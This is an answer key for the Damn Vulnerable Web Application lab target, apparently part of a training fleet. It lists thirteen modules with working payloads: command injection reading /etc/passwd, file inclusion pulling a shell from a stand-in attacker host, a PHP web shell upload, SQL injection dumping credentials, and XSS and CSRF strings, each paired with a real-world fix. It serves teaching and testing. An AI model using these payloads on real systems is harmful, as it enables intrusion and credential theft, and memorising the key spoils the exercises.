# DVWA vulnerabilities

Answer key for the **dvwa** target (Damn Vulnerable Web Application). The modules
are self-labelled in the app, but this document is the ground truth for
maintainers and instructors. DVWA is upstream software, so these follow its
documented modules; behaviour changes with the selected security level.

> **Intentionally vulnerable. Isolated testing only.** Do not run dvwa anywhere it
> can be reached from an untrusted network.

- **App:** Damn Vulnerable Web Application (PHP + MariaDB/MySQL + Apache)
- **Start:** `./vam start dvwa`
- **URL:** `http://127.0.0.1:7002`
- **Login:** `admin` / `password`
- **Setup:** browse `/setup.php` and click "Create / Reset Database" once (the
  fleet does this automatically).
- **Security level:** set under **DVWA Security** (`/security.php`) to
  low / medium / high / impossible. Payloads below assume **low** unless noted;
  each module gets harder per level, and "impossible" is the secure reference.

Status legend:

- **Live** - reachable and exploitable in the running app. (Every DVWA module is Live.)

## Summary

| ID | Vulnerability | Category | Status |
|----|---------------|----------|--------|
| DV1 | Brute force (no lockout) | Broken Authentication | Live |
| DV2 | Command injection | Injection | Live |
| DV3 | CSRF (password change) | Broken Access Control | Live |
| DV4 | File inclusion (LFI / RFI) | Injection / Access Control | Live |
| DV5 | Unrestricted file upload | Insecure Design | Live |
| DV6 | Insecure CAPTCHA bypass | Broken Authentication | Live |
| DV7 | SQL injection | Injection | Live |
| DV8 | Blind SQL injection | Injection | Live |
| DV9 | Weak session IDs | Broken Authentication | Live |
| DV10 | Reflected XSS | Injection (XSS) | Live |
| DV11 | Stored XSS | Injection (XSS) | Live |
| DV12 | DOM XSS | Injection (XSS) | Live |
| DV13 | Security misconfiguration / open HTTP | Misconfiguration | Live |

## Vulnerabilities

### DV1 - Brute force

- **Where:** `/vulnerabilities/brute/` login form; no lockout or throttling.
- **Reproduce:** point Burp Intruder / hydra at the username and password params
  (low sends them via GET, `?username=admin&password=x&Login=Login`) and detect the
  "Welcome" response for `admin` / `password`. Medium adds a small sleep; high adds
  an anti-CSRF token to reuse per attempt.
- **Real-world fix:** rate-limit and lock after N failures, add MFA, and use a
  generic failure message.

### DV2 - Command injection

- **Where:** `/vulnerabilities/exec/` ping field passes input to a shell.
- **Reproduce:** enter `127.0.0.1; cat /etc/passwd` (low). Medium strips `;` and
  `&&`, so use a pipe: `127.0.0.1 | whoami`. High blocklists more, but variants
  still slip through.
- **Real-world fix:** avoid shelling out; if unavoidable, use argument arrays with
  no shell and strict allowlisted input.

### DV3 - CSRF

- **Where:** `/vulnerabilities/csrf/` change-password form uses a state-changing
  GET with no unpredictable token (low).
- **Reproduce:** host a page that auto-loads
  `/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change`;
  a logged-in victim's password changes. Medium checks the Referer; high adds a
  user-token.
- **Real-world fix:** require a per-request anti-CSRF token, use POST, and set
  SameSite cookies.

### DV4 - File inclusion (LFI / RFI)

- **Where:** `/vulnerabilities/fi/?page=` includes the `page` value directly.
- **Reproduce:** LFI with `?page=../../../../etc/passwd` or
  `?page=php://filter/convert.base64-encode/resource=index.php`; RFI (low, with
  `allow_url_include`) with `?page=http://attacker/shell.txt`. Medium strips
  `http://` and `../`; bypass with `http://`, absolute paths, or nesting.
- **Real-world fix:** never include user-controlled paths; use an allowlist of
  fixed page ids and disable `allow_url_include`.

### DV5 - Unrestricted file upload

- **Where:** `/vulnerabilities/upload/` writes uploads under `hackable/uploads/`.
- **Reproduce:** upload `shell.php` containing `<?php system($_GET['c']); ?>`, then
  browse `../../hackable/uploads/shell.php?c=id`. Medium checks the Content-Type
  header (spoof it); high checks the extension (use `shell.php.jpg` plus GIF magic
  bytes / combined with LFI).
- **Real-world fix:** validate content server-side, store outside the web root,
  rename files, and never execute uploads.

### DV6 - Insecure CAPTCHA

- **Where:** `/vulnerabilities/captcha/` change-password flow trusts a
  client-controlled step after the reCAPTCHA check.
- **Reproduce:** intercept the request and set `step=2` (or drop the
  `g-recaptcha-response`) to change the password without solving the CAPTCHA.
- **Real-world fix:** verify the CAPTCHA server-side within the same atomic action
  and never trust a client-supplied "already validated" flag.

### DV7 - SQL injection

- **Where:** `/vulnerabilities/sqli/?id=` builds the query by concatenation.
- **Reproduce:** submit `1' OR '1'='1` to return all rows, or dump credentials with
  `1' UNION SELECT user, password FROM users-- -`. Medium uses a numeric POST id
  (still injectable); high moves the id to a session variable.
- **Real-world fix:** parameterized queries and least-privilege DB accounts.

### DV8 - Blind SQL injection

- **Where:** `/vulnerabilities/sqli_blind/` returns only "exists / does not exist".
- **Reproduce:** boolean-based `1' AND 1=1-- -` vs `1' AND 1=2-- -`; time-based
  `1' AND SLEEP(5)-- -` to infer data one bit at a time.
- **Real-world fix:** parameterized queries; identical responses and timing for
  valid and invalid input.

### DV9 - Weak session IDs

- **Where:** `/vulnerabilities/weak_id/` issues a predictable `dvwaSession` cookie.
- **Reproduce:** request the page repeatedly; the id increments sequentially (low)
  or is a trivial hash of a counter, so the next valid session is predictable.
- **Real-world fix:** generate session ids from a CSPRNG with sufficient entropy.

### DV10 - Reflected XSS

- **Where:** `/vulnerabilities/xss_r/?name=` echoes `name` unescaped.
- **Reproduce:** `?name=<script>alert(document.cookie)</script>`. Medium strips
  `<script>` (bypass with `<img src=x onerror=alert(1)>`); high uses a stricter
  regex still bypassable with event handlers.
- **Real-world fix:** context-aware output encoding and CSP.

### DV11 - Stored XSS

- **Where:** `/vulnerabilities/xss_s/` guestbook stores the message field.
- **Reproduce:** submit `<script>alert(document.cookie)</script>` as the message
  (raise the input `maxlength` via the proxy or dev tools); it fires for every
  later visitor. Medium/high filter the name/message differently.
- **Real-world fix:** encode on output, sanitize on input, and apply CSP.

### DV12 - DOM XSS

- **Where:** `/vulnerabilities/xss_d/?default=` writes the `default` param into the
  DOM via client-side script.
- **Reproduce:** `?default=<script>alert(1)</script>` (low). Medium filters
  `<script>`; bypass by breaking out of the option context, e.g.
  `?default=</option></select><img src=x onerror=alert(1)>`.
- **Real-world fix:** use safe DOM APIs (`textContent`), validate the value against
  an allowlist, and apply CSP.

### DV13 - Security misconfiguration / open HTTP

- **Where:** the whole app: default credentials, plaintext HTTP, verbose PHP
  errors, and `allow_url_include` enabled to make RFI (DV4) work.
- **Reproduce:** log in with the shipped `admin`/`password`, observe no TLS, and
  note the PHP settings that widen the other modules.
- **Real-world fix:** change defaults, enforce TLS, disable dangerous PHP options,
  and suppress detailed errors in production.

## Notes and scope

DVWA is self-documenting: every module has "View Help" and "View Source" buttons
that show the exact vulnerable code at each security level, and the "impossible"
level is the secure reference implementation. The DVWA GitHub README is the
upstream authority. Keep this file aligned with the version pinned in
`apps/dvwa/app.yml`.
